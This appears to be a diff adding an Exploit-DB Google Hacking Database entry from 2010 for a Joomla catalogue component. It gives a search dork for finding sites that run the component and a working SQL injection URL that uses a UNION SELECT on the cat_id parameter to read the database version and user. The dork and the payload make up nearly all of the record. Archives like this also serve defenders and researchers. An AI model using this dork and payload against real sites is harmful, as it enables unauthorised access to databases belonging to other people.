@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3622
+Category:         Advisories and Vulnerabilities
+Published Date:   2010-11-25
+Author:           anonymous
+GoogleDork:       inurl:"index.php?option=com_catalogue"
+Description:      inurl:"index.php?option=com_catalogue"
+
+
+Author: Ashiyane Digital Security Team SQL Injection: http://server/index.php?option=com_catalogue&amp;Itemid=73&amp;cat_id=-999 union select 1,version(),user(),4,5,6
